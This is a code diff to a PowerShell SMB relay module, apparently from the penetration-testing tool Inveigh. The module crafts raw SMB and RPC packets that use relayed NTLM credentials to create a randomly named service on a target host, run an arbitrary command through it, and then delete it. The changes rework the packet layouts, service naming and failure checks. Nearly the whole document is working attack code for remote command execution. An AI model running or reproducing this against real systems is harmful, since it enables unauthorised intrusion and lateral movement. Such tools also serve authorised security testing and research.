@@ -614,33 +614,40 @@ $SMB_relay_execute_scriptblock =
         {
             $SMB_relay_execute_stream = $SMB_relay_socket.GetStream()
         }
-        
+
+        $SMB_relay_failed = $false
         $SMB_relay_execute_bytes = New-Object System.Byte[] 1024
-        
-        $SMB_service_random = [String]::Join("00-", (1..11 | % {"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
-        $SMB_machine += '53-00-52-00-56-00-' + $SMB_service_random + '00-00-00'
-        $SMB_service_name = $SMB_service_random + '00-00-00'
-        $SMB_service_display = '49-00-56-00-53-00-52-00-56-00-' + $SMB_service_random + '00-00-00'
-        [Byte[]]$SMB_machine_bytes = $SMB_machine.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
-        [Byte[]]$SMB_service_bytes = $SMB_service_name.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
-        [Byte[]]$SMB_service_display_bytes = $SMB_service_display.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
-        
+        $SMB_service_random = [String]::Join("00-", (1..20 | % {"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
+        $SMB_service = $SMB_service_random -replace "-00",""
+        $SMB_service = $SMB_service.Substring(0,$SMB_service.Length-1)
+        $SMB_service = $SMB_service.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
+        $SMB_service_random += '00-00-00'
+        [Byte[]]$SMB_service_bytes = $SMB_service_random.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
+        $SMB_referent_ID_bytes = [String](1..4 | % {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
+        $SMB_referent_ID_bytes = $SMB_referent_ID_bytes.Split(" ") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
         $SMBRelayCommand = "%COMSPEC% /C `"" + $SMBRelayCommand + "`""
         [System.Text.Encoding]::ASCII.GetBytes($SMBRelayCommand) | % { $SMB_relay_command += "{0:X2}-00-" -f $_ }
-        $SMB_relay_command += '00-00'
+
+        if([bool]($SMBRelayCommand.length%2))
+        {
+            $SMB_relay_command += '00-00'
+        }
+        else
+        {
+            $SMB_relay_command += '00-00-00-00'
+        }    
+        
         [Byte[]]$SMB_relay_command_bytes = $SMB_relay_command.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
-        
-        $SMB_service_data_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + 253)
+        $SMB_service_data_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + $SMB_service_bytes.length + 237)
         $SMB_service_data_length_bytes = $SMB_service_data_length_bytes[2..0]
-        
-        $SMB_service_byte_count_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + 253 - 63)
-        $SMB_service_byte_count_bytes = $SMB_service_byte_count_bytes[0..1]
-        
+        $SMB_service_byte_count_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + $SMB_service_bytes.length + 237 - 63)
+        $SMB_service_byte_count_bytes = $SMB_service_byte_count_bytes[0..1]   
         $SMB_relay_command_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length / 2)
-        
+
         $k = 0
 
-        :SMB_relay_execute_loop while ($k -lt 14)
+        :SMB_relay_execute_loop while ($k -lt 12)
         {
             switch ($k)
             {
@@ -683,15 +690,15 @@ $SMB_relay_execute_scriptblock =
                 }
                 
                 4 {
-                    [Byte[]] $SMB_relay_execute_send = (0x00,0x00,0x00,0x8f,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
+                    [Byte[]] $SMB_relay_execute_send = (0x00,0x00,0x00,0x9b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                         + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                         + $inveigh.process_ID_bytes`
                         + $SMB_user_ID`
                         + (0x06,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x50)`
-                        + (0x00,0x00,0x00,0x50,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x50,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
-                        + (0x00,0x50,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03)`
-                        + (0x00,0x0f,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,0x00,0x00)`
-                        + $SMB_machine_bytes`
+                        + (0x00,0x00,0x00,0x5c,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x5c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
+                        + (0x00,0x5c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03)`
+                        + (0x00,0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00)`
+                        + $SMB_service_bytes`
                         + (0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00)
                         
                         $SMB_multiplex_id = (0x07)
@@ -708,7 +715,7 @@ $SMB_relay_execute_scriptblock =
                         + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                         + $inveigh.process_ID_bytes`
                         + $SMB_user_ID`
-                        + (0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x9f,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00)`
+                        + (0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00)`
                         + $SMB_service_byte_count_bytes`
                         + (0x00,0x00)`
                         + $SMB_service_byte_count_bytes`
@@ -717,19 +724,21 @@ $SMB_relay_execute_scriptblock =
                         + (0x05,0x00,0x00,0x03,0x10)`
                         + (0x00,0x00,0x00)`
                         + $SMB_service_byte_count_bytes`
-                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x62,0x01,0x00,0x00,0x00,0x00,0x0c,0x00)`
+                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00)`
                         + $SMB_context_handler`
-                        + (0x0c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x00,0x00)`
+                        + (0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00)`
                         + $SMB_service_bytes`
-                        + (0x21,0x03,0x03,0x00,0x11,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00)`
-                        + $SMB_service_display_bytes`
+                        + (0x00,0x00)`
+                        + $SMB_referent_ID_bytes`
+                        + (0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00)`
+                        + $SMB_service_bytes`
                         + (0x00,0x00,0xff,0x01,0x0f,0x00,0x10,0x01,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                         + $SMB_relay_command_length_bytes`
                         + (0x00,0x00,0x00,0x00)`
                         + $SMB_relay_command_length_bytes`
                         + $SMB_relay_command_bytes`
                         + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
-                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
+                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
                         
                         $SMB_multiplex_id = (0x09)
                 }
@@ -737,44 +746,25 @@ $SMB_relay_execute_scriptblock =
                 7 {
                     [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                 }
+
                 
                 8 {
-                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x93,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
-                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
-                        + $inveigh.process_ID_bytes`
-                        + $SMB_user_ID`
-                        + (0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x9f,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x54)`
-                        + (0x00,0x00,0x00,0x54,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x54,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
-                        + (0x00,0x54,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x00,0x00,0x00,0x00,0x00,0x10,0x00)`
-                        + $SMB_context_handler`
-                        + (0x0c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x00,0x00)`
-                        + $SMB_service_bytes`
-                        + (0xff,0x01,0x0f,0x00)
-                        
-                        $SMB_multiplex_id = (0x0b)
-                }
-                
-                9 {
-                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
-                }
-                
-                10 {
                     [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x73,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                         + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                         + $inveigh.process_ID_bytes`
                         + $SMB_user_ID`
-                        + (0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x9f,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x34)`
+                        + (0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x34)`
                         + (0x00,0x00,0x00,0x34,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                         + (0x00,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x00,0x00,0x13,0x00)`
                         + $SMB_context_handler`
                         + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
                 }
                 
-                11 {
+                9 {
                     [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                 }
                 
-                12 { 
+                10 { 
                     [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x6b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                         + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                         + $inveigh.process_ID_bytes`
@@ -784,7 +774,7 @@ $SMB_relay_execute_scriptblock =
                         + (0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,0x00,0x00,0x00,0x02,0x00)`
                         + $SMB_context_handler
                 }
-                13 {
+                11 {
                     [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                 }
             }
@@ -803,8 +793,7 @@ $SMB_relay_execute_scriptblock =
                     {
                         $inveigh.console_queue.add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                         $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")])
-                        $inveigh.SMB_relay_active_step = 0
-                        $SMB_relay_socket.Close()
+                        $SMB_relay_failed = $true
                         break SMB_relay_execute_loop
                     }
                 }
@@ -814,28 +803,33 @@ $SMB_relay_execute_scriptblock =
             {
                 $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)
                 $SMB_context_handler = $SMB_relay_execute_bytes[88..107]
-                
-                if($SMB_relay_execute_bytes[108] -eq 0)
+
+                if(([System.BitConverter]::ToString($SMB_relay_execute_bytes[108..111]) -eq '00-00-00-00') -and ([System.BitConverter]::ToString($SMB_context_handler) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00'))
                 {
                     $inveigh.console_queue.add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $SMBRelayTarget")
                     $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $SMBRelayTarget")])
-                    $SMB_relay_failed = $false
                 }
-                else
+                elseif([System.BitConverter]::ToString($SMB_relay_execute_bytes[108..111]) -eq '05-00-00-00')
                 {
                     $inveigh.console_queue.add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $SMBRelayTarget")
                     $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $SMBRelayTarget")])
                     $inveigh.SMBRelay_failed_list += "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget"
                     $SMB_relay_failed = $true
                 }
+                else
+                {
+                    $SMB_relay_failed = $true
+                }
+
             }
-            elseif (($k -eq 7) -or ($k -eq 11) -or ($k -eq 13))
+            elseif (($k -eq 7) -or ($k -eq 9) -or ($k -eq 11))
             {
                 $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)
-                
+
                 switch($k)
                 {
                     7 {
+                        $SMB_context_handler = $SMB_relay_execute_bytes[92..111]
                         $SMB_relay_execute_error_message = "Service creation fault context mismatch"
                     }
                     11 {
@@ -846,38 +840,29 @@ $SMB_relay_execute_scriptblock =
                     }
                 }
                 
-                if([System.BitConverter]::ToString($SMB_relay_execute_bytes[88..91]) -eq ('1a-00-00-1c'))
+                if([System.BitConverter]::ToString($SMB_context_handler[0..3]) -ne '00-00-00-00')
+                {
+                    $SMB_relay_failed = $true
+                }
+
+                if([System.BitConverter]::ToString($SMB_relay_execute_bytes[88..91]) -eq '1a-00-00-1c')
                 {
                     $inveigh.console_queue.add("$SMB_relay_execute_error_message service on $SMBRelayTarget")
                     $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $SMB_relay_execute_error on $SMBRelayTarget")])
                     $SMB_relay_failed = $true
                 }
-                else
-                {
-                    if(!$SMB_relay_failed)
-                    {
-                        $SMB_relay_failed = $false
-                    }
-                }
-            }
-            elseif ($k -eq 9) 
-            {
-                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)
-                $SMB_context_handler = $SMB_relay_execute_bytes[88..107]
-                
-                if([System.BitConverter]::ToString($SMB_relay_execute_bytes[88..91]) -eq ('1a-00-00-1c')) # need better checks
-                {
-                    $inveigh.console_queue.add("Service open fault context mismatch on $SMBRelayTarget")
-                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Service open fault context mismatch on $SMBRelayTarget")])
-                    $SMB_relay_failed = $true
-                }
-            }
+            }        
             else
             {
                 $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)    
             }
             
-            if((!$SMB_relay_failed) -and ($k -eq 11))
+            if((!$SMB_relay_failed) -and ($k -eq 7))
+            {
+                $inveigh.console_queue.add("SMB relay service $SMB_service created on $SMBRelayTarget")
+                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay service $SMB_service created on $SMBRelayTarget")])
+            }
+            elseif((!$SMB_relay_failed) -and ($k -eq 9))
             {
                 $inveigh.console_queue.add("SMB relay command likely executed on $SMBRelayTarget")
                 $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay command likely executed on $SMBRelayTarget")])
@@ -889,10 +874,10 @@ $SMB_relay_execute_scriptblock =
                     $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay auto disabled due to success")])
                 }
             }
-            elseif((!$SMB_relay_failed) -and ($k -eq 13))
+            elseif((!$SMB_relay_failed) -and ($k -eq 11))
             {
-                $inveigh.console_queue.add("SMB relay command execution service deleted on $SMBRelayTarget")
-                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay command execution service deleted on $SMBRelayTarget")])
+                $inveigh.console_queue.add("SMB relay service $SMB_service deleted on $SMBRelayTarget")
+                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $SMBRelayTarget")])
                 }   
             
             [Byte[]]$SMB_relay_execute_ReadAndRequest = (0x00,0x00,0x00,0x37,0xff,0x53,0x4d,0x42,0x2e,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
@@ -900,8 +885,15 @@ $SMB_relay_execute_scriptblock =
                 + $inveigh.process_ID_bytes`
                 + $SMB_user_ID`
                 + $SMB_multiplex_ID`
-                + (0x00,0x0a,0xff,0x00,0x00,0x00,0x00,0x40,0x19,0x03,0x00,0x00,0xed,0x01,0xed,0x01,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00)
+                + (0x00,0x0a,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x58,0x02,0x58,0x02,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00)
             
+            if($SMB_relay_failed)
+            {
+                $inveigh.console_queue.add("SMB relay failed on $SMBRelayTarget")
+                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay failed on $SMBRelayTarget")])
+                BREAK SMB_relay_execute_loop
+            }
+
             $k++
         }
         
